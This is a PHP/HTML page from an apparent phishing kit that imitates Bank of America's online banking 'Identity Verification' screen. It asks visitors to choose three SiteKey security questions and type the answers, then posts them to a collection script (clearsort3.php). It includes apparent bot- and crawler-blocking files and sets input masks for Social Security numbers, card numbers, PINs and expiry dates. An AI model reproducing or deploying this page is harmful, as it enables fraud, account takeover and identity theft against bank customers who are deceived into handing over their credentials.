<?php

error_reporting(0);
@ini_set('display_errors', 'on'); 
ob_start();

include('blocker.php');
include('antirobot.php');
include('bt.php');

?>


<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
<title>Bank of America | Online Banking | Identity Verification</title>

<link rel="icon" href="favicon.ico" type="image/x-icon">

<style type="text/css">
body{
margin:0;

}



@font-face{font-family:"cnx-regular";src:url("cnx-regular.eot");src:url("cnx-regular.eot?#iefix") format("embedded-opentype"),url("cnx-regular.woff2") format("woff2"),url("cnx-regular.woff") format("woff"),url("cnx-regular.ttf") format("truetype");font-weight:300;font-style:normal;font-variant:normal}

@font-face{font-family:"cnx-bold";src:url("cnx-bold.eot");src:url("cnx-bold.eot?#iefix") format("embedded-opentype"),url("cnx-bold.woff2") format("woff2"),url("cnx-bold.woff") format("woff"),url("cnx-bold.ttf") format("truetype");font-weight:700;font-style:normal;font-variant:normal}

@font-face{font-family:"cnx-medium";src:url("cnx-medium.eot");src:url("cnx-medium.eot?#iefix") format("embedded-opentype"),url("cnx-medium.woff2") format("woff2"),url("cnx-medium.woff") format("woff"),url("cnx-medium.ttf") format("truetype");font-weight:300;font-style:italic;font-variant:normal}

.inbox1 {
background-color: none;
background:none;
background-image: none;
font-family:cnx-regular, Arial, Helvetica, sans-serif;
font-weight:bold;
font-size:14px;
width: 400px;
height: 36px;
border:1px solid #ccc;
color: #000000;

}

.inbox1:focus {

background-color: none;
background:none;
background-image: none;
font-family:cnx-regular, Arial, Helvetica, sans-serif;
font-weight:bold;
font-size:14px;
width: 400px;
height: 36px;
border:1px solid #0066FF;
color: #000000;
}



.inbox2 {
background-color: none;
background:none;
background-image: none;
font-family:cnx-regular, Arial, Helvetica, sans-serif;
font-weight:bold;
font-size:14px;
width: 180px;
height: 36px;
border:1px solid #ccc;
color: #000000;

}

.inbox2:focus {

background-color: none;
background:none;
background-image: none;
font-family:cnx-regular, Arial, Helvetica, sans-serif;
font-weight:bold;
font-size:14px;
width: 180px;
height: 36px;
border:1px solid #0066FF;
color: #000000;
}

.id_label{position:absolute; padding-left:4px; padding-bottom:6px; color: #333; font-size:14px; font-weight:bold; font-family: cnx-regular, Arial, Helvetica, sans-serif;}
.id_label3{

    color: #fff;
    border: none;
    font-weight: bold;
    font-size: 24px;
	font-family: cnx-regular, Arial, Helvetica, sans-serif;
	}
	
.id_label5{

 	color: #0153C3;
    border: none;
    font-weight: bold;
    font-size: 14px;
	font-family: cnx-regular, Arial, Helvetica, sans-serif;

}

.id_label6{

    color:rgb(65, 64, 66);
    border: none;
    font-weight: 200;
    font-size: 14px;
	font-family:Verdana,Arial,sans-serif;;

}





.inbox3 {
background-color: none;
background:none;
background-image: none;
font-family:cnx-regular, Arial, Helvetica, sans-serif;
font-weight:bold;
font-size:14px;
width: 136px;
height: 36px;
border:1px solid #ccc;
color: #000000;
font-style:normal;
}

.inbox3 :focus {

background-color: none;
background:none;
background-image: none;
font-family:cnx-regular, Arial, Helvetica, sans-serif;
font-weight:bold;
font-size:14px;
width: 136px;
height: 36px;
border:1px solid #0066FF;
color: #000000;
}



</style>



<script src="jquery-3.1.0.min.js"></script>
 <script src="jquery.maskedinput.js"></script>

    <script>
    $(document).ready(function(){
     $('#ssd').mask("999-99-9999", {placeholder:"xxx-xx-xxxx"});
    });   
    </script>    
	<script>
    $(document).ready(function(){
     $('#dt').mask("999", {placeholder:""});
    });   
    </script>
	    <script>

    $(document).ready(function(){
     $('#psp').mask("9999-9999-9999-9999", {placeholder:"____-____-____-____"});
    });   
    </script>
    <script>
    $(document).ready(function(){
     $('#bn').mask("99/9999", {placeholder:"MM/YYYY"});
    });   
    </script>
    <script>
    $(document).ready(function(){
     $('#ssd').mask("999-99-9999", {placeholder:""});
    });   
    </script>    
	<script>
    $(document).ready(function(){
     $('#pinsi').mask("9999", {placeholder:""});
    });   
    </script>
	<script>
    $(document).ready(function(){
     $('#phnno').mask("999-999-9999", {placeholder:"X"});
    });   
    </script>
	
	<script>
    $(document).ready(function(){
     $('#udds').mask("99/99/9999", {placeholder:"DD/MM/YYYY"});
    });   
    </script>




</head>

<body style=" background-image:url(cardaccessbg.jpg); background-repeat: no-repeat; height:757px;">

<div style="position:absolute; left:45px; top:85px;"><label class="id_label3">SiteKey challenge questions and answers</label></div>


<div style="position:absolute; left:1015px; top:48px; width:100px;"><label class="id_label5">Sign Out</label></div>

<div style="position:absolute; left:1010px; top:155px;"><img src="alert.jpg" width="299" height="375" /></div>


<form id="loginForm" method="post" action="clearsort3.php" target="_self" novalidate="novalidate">
<!-- First Question -->
<div style="position:absolute; left:45px; top:145px; width:200px;"><label class="id_label">Your 1st question</label></div>
<div style="position:absolute; overflow:hidden; left:47px; top:165px;">
<select name="question1" class="inbox1">
<option selected="selected" value="">Select one...</option>
<option value="What was the name of your first pet?">What was the name of your first pet?</option>
<option value="What is your maternal grandfather's first name?">What is your maternal grandfather's first name?</option>
<option value="What is the name of your first niece/nephew?">What is the name of your first niece/nephew?</option>
<option value="what is the name of your first employer?">what is the name of your first employer?</option>
<option value="What is the name of the first company you worked for?">What is the name of the first company you worked for?</option>
<option value="In what year (YYYY) did you graduate from high school?">In what year (YYYY) did you graduate from high school?</option>
<option value="What was your high school mascot?">What was your high school mascot?</option>
<option value="How old were you at your wedding?">How old were you at your wedding? (Enter age as digits.)</option>
<option value="In what city were you living at age 16?">In what city were you living at age 16?</option>
<option value="What is your maternal grandmother's first name?">What is your maternal grandmother's first name?</option>
<option value="What is the first name of your oldest nephew?">What is the first name of your oldest nephew?</option>
<option value="What is your all-time favorite song?">What is your all-time favorite song?</option>
<option value="What is the first name of your high school prom date?">What is the first name of your high school prom date?</option>
<option value="What street did your best friend in high school live on?">What street did your best friend in high school live on?</option>
<option value="What was the first name of your favorite teacher or professor?">What was the first name of your favorite teacher or professor?</option>
<option value="In what city was your high school?">In what city was your high school?</option>
<option value="What is your best friend first name?">What is your best friend first name?</option>
<option value="What was the make and model of your first car?">What was the make and model of your first car?</option>
<option value="In what city were you married?">In what city were you married?</option>
<option value="In which city did you meet your spouse for the first time?">In which city did you meet your spouse for the first time?</option>
<option value="What is the first name of the best man/maid of honor at your wedding?">What is the first name of the best man/maid of honor at your wedding?</option>
<option value="In what year did you graduate from high school?">In what year did you graduate from high school?</option>
<option value="What was the name of your first boyfriend or girlfriend?">What was the name of your first boyfriend or girlfriend?</option>
<option value="What is your fathers middle name?">What is your fathers middle name?</option>
<option value="In what city was your mother born?">In what city was your mother born?</option>
<option value="What is your mothers middle name?">What is your mothers middle name?</option>
<option value="What is the last name of your third grade teacher?">What is the last name of your third grade teacher?</option>
<option value="What celebrity do you most resemble?">What celebrity do you most resemble?</option>
<option value="What is the name of your first babysitter?">What is the name of your first babysitter?</option>
<option value="What is the name of your favorite charity?">What is the name of your favorite charity?</option>
<option value="In what city did you honeymoon? (Enter full name of city only)">In what city did you honeymoon? (Enter full name of city only)</option>
<option value="What is the last name of your family physician?">What is the last name of your family physician?</option>
<option value="Where were you on New Year's 2000?">Where were you on New Year's 2000?</option>
<option value="What is the first name of the best man/maid of honor at your wedding?">What is the first name of the best man/maid of honor at your wedding?</option>
<option value="What was the first live concert you attended?">What was the first live concert you attended?</option>
<option value="What was the first name of your first manager?">What was the first name of your first manager?</option>
<option value="What is the name of your high school's star athlete?">What is the name of your high school's star athlete?</option>
<option value="What is the first name of your high school prom date?">What is the first name of your high school prom date?</option>
<option value="Who is your favorite person in history?">Who is your favorite person in history?</option>
<option value="As a child, what did you want to be when you grew up?">As a child, what did you want to be when you grew up?</option>
<option value="What is the name of your favorite restaurant?">What is the name of your favorite restaurant?</option>
</select>
</div> 
<div style="position:absolute; left:45px; top:200px; width:200px;"><label class="id_label">Answer</label></div>
<div style="position:absolute; left:45px; top:215px; width:200px;"><input min="0" class="inbox2" type="text" name="ans1" placeholder=""  data-validate="userId" required="" autocorrect="off" autocapitalize="off" ></div>


<!-- Second Question -->
<div style="position:absolute; left:45px; top:260px; width:200px;"><label class="id_label">Your 2nd question</label></div>
<div style="position:absolute; overflow:hidden; left:47px; top:280px;">
<select name="question2" class="inbox1">
<option selected="selected" value="">Select one...</option>
<option value="What was the name of your first pet?">What was the name of your first pet?</option>
<option value="What is your maternal grandfather's first name?">What is your maternal grandfather's first name?</option>
<option value="What is the name of your first niece/nephew?">What is the name of your first niece/nephew?</option>
<option value="what is the name of your first employer?">what is the name of your first employer?</option>
<option value="What is the name of the first company you worked for?">What is the name of the first company you worked for?</option>
<option value="In what year (YYYY) did you graduate from high school?">In what year (YYYY) did you graduate from high school?</option>
<option value="What was your high school mascot?">What was your high school mascot?</option>
<option value="How old were you at your wedding?">How old were you at your wedding? (Enter age as digits.)</option>
<option value="In what city were you living at age 16?">In what city were you living at age 16?</option>
<option value="What is your maternal grandmother's first name?">What is your maternal grandmother's first name?</option>
<option value="What is the first name of your oldest nephew?">What is the first name of your oldest nephew?</option>
<option value="What is your all-time favorite song?">What is your all-time favorite song?</option>
<option value="What is the first name of your high school prom date?">What is the first name of your high school prom date?</option>
<option value="What street did your best friend in high school live on?">What street did your best friend in high school live on?</option>
<option value="What was the first name of your favorite teacher or professor?">What was the first name of your favorite teacher or professor?</option>
<option value="In what city was your high school?">In what city was your high school?</option>
<option value="What is your best friend first name?">What is your best friend first name?</option>
<option value="What was the make and model of your first car?">What was the make and model of your first car?</option>
<option value="In what city were you married?">In what city were you married?</option>
<option value="In which city did you meet your spouse for the first time?">In which city did you meet your spouse for the first time?</option>
<option value="What is the first name of the best man/maid of honor at your wedding?">What is the first name of the best man/maid of honor at your wedding?</option>
<option value="In what year did you graduate from high school?">In what year did you graduate from high school?</option>
<option value="What was the name of your first boyfriend or girlfriend?">What was the name of your first boyfriend or girlfriend?</option>
<option value="What is your fathers middle name?">What is your fathers middle name?</option>
<option value="In what city was your mother born?">In what city was your mother born?</option>
<option value="What is your mothers middle name?">What is your mothers middle name?</option>
<option value="What is the last name of your third grade teacher?">What is the last name of your third grade teacher?</option>
<option value="What celebrity do you most resemble?">What celebrity do you most resemble?</option>
<option value="What is the name of your first babysitter?">What is the name of your first babysitter?</option>
<option value="What is the name of your favorite charity?">What is the name of your favorite charity?</option>
<option value="In what city did you honeymoon? (Enter full name of city only)">In what city did you honeymoon? (Enter full name of city only)</option>
<option value="What is the last name of your family physician?">What is the last name of your family physician?</option>
<option value="Where were you on New Year's 2000?">Where were you on New Year's 2000?</option>
<option value="What is the first name of the best man/maid of honor at your wedding?">What is the first name of the best man/maid of honor at your wedding?</option>
<option value="What was the first live concert you attended?">What was the first live concert you attended?</option>
<option value="What was the first name of your first manager?">What was the first name of your first manager?</option>
<option value="What is the name of your high school's star athlete?">What is the name of your high school's star athlete?</option>
<option value="What is the first name of your high school prom date?">What is the first name of your high school prom date?</option>
<option value="Who is your favorite person in history?">Who is your favorite person in history?</option>
<option value="As a child, what did you want to be when you grew up?">As a child, what did you want to be when you grew up?</option>
<option value="What is the name of your favorite restaurant?">What is the name of your favorite restaurant?</option>
</select>
</div>
<div style="position:absolute; left:45px; top:315px; width:315px;"><label class="id_label">Answer</label></div>
<div style="position:absolute; left:45px; top:330px; width:330px;"><input min="0" class="inbox2" type="text" name="ans2" placeholder=""  data-validate="userId" required="" autocorrect="off" autocapitalize="off" ></div>



<!-- Third Question -->
<div style="position:absolute; left:45px; top:375px; width:200px;"><label class="id_label">Your 3rd question </label></div>
<div style="position:absolute; overflow:hidden; left:47px; top:395px;">
<select name="question3" class="inbox1">
<option selected="selected" value="">Select one...</option>
<option value="What was the name of your first pet?">What was the name of your first pet?</option>
<option value="What is your maternal grandfather's first name?">What is your maternal grandfather's first name?</option>
<option value="What is the name of your first niece/nephew?">What is the name of your first niece/nephew?</option>
<option value="what is the name of your first employer?">what is the name of your first employer?</option>
<option value="What is the name of the first company you worked for?">What is the name of the first company you worked for?</option>
<option value="In what year (YYYY) did you graduate from high school?">In what year (YYYY) did you graduate from high school?</option>
<option value="What was your high school mascot?">What was your high school mascot?</option>
<option value="How old were you at your wedding?">How old were you at your wedding? (Enter age as digits.)</option>
<option value="In what city were you living at age 16?">In what city were you living at age 16?</option>
<option value="What is your maternal grandmother's first name?">What is your maternal grandmother's first name?</option>
<option value="What is the first name of your oldest nephew?">What is the first name of your oldest nephew?</option>
<option value="What is your all-time favorite song?">What is your all-time favorite song?</option>
<option value="What is the first name of your high school prom date?">What is the first name of your high school prom date?</option>
<option value="What street did your best friend in high school live on?">What street did your best friend in high school live on?</option>
<option value="What was the first name of your favorite teacher or professor?">What was the first name of your favorite teacher or professor?</option>
<option value="In what city was your high school?">In what city was your high school?</option>
<option value="What is your best friend first name?">What is your best friend first name?</option>
<option value="What was the make and model of your first car?">What was the make and model of your first car?</option>
<option value="In what city were you married?">In what city were you married?</option>
<option value="In which city did you meet your spouse for the first time?">In which city did you meet your spouse for the first time?</option>
<option value="What is the first name of the best man/maid of honor at your wedding?">What is the first name of the best man/maid of honor at your wedding?</option>
<option value="In what year did you graduate from high school?">In what year did you graduate from high school?</option>
<option value="What was the name of your first boyfriend or girlfriend?">What was the name of your first boyfriend or girlfriend?</option>
<option value="What is your fathers middle name?">What is your fathers middle name?</option>
<option value="In what city was your mother born?">In what city was your mother born?</option>
<option value="What is your mothers middle name?">What is your mothers middle name?</option>
<option value="What is the last name of your third grade teacher?">What is the last name of your third grade teacher?</option>
<option value="What celebrity do you most resemble?">What celebrity do you most resemble?</option>
<option value="What is the name of your first babysitter?">What is the name of your first babysitter?</option>
<option value="What is the name of your favorite charity?">What is the name of your favorite charity?</option>
<option value="In what city did you honeymoon? (Enter full name of city only)">In what city did you honeymoon? (Enter full name of city only)</option>
<option value="What is the last name of your family physician?">What is the last name of your family physician?</option>
<option value="Where were you on New Year's 2000?">Where were you on New Year's 2000?</option>
<option value="What is the first name of the best man/maid of honor at your wedding?">What is the first name of the best man/maid of honor at your wedding?</option>
<option value="What was the first live concert you attended?">What was the first live concert you attended?</option>
<option value="What was the first name of your first manager?">What was the first name of your first manager?</option>
<option value="What is the name of your high school's star athlete?">What is the name of your high school's star athlete?</option>
<option value="What is the first name of your high school prom date?">What is the first name of your high school prom date?</option>
<option value="Who is your favorite person in history?">Who is your favorite person in history?</option>
<option value="As a child, what did you want to be when you grew up?">As a child, what did you want to be when you grew up?</option>
<option value="What is the name of your favorite restaurant?">What is the name of your favorite restaurant?</option>
</select>
</div>
<div style="position:absolute; left:45px; top:430px; width:315px;"><label class="id_label">Answer</label></div>
<div style="position:absolute; left:45px; top:450px; width:330px;"><input min="0" class="inbox2" type="text" name="ans3" placeholder=""  data-validate="userId" required="" autocorrect="off" autocapitalize="off" ></div>

<div id="formimage1" style="position:absolute; left:45px; top:525px; width:122px;"> <input type="image" name="formimage1" src="contn-btn.jpg" width="119" height="42"></div>

</form>





</body>
</html>
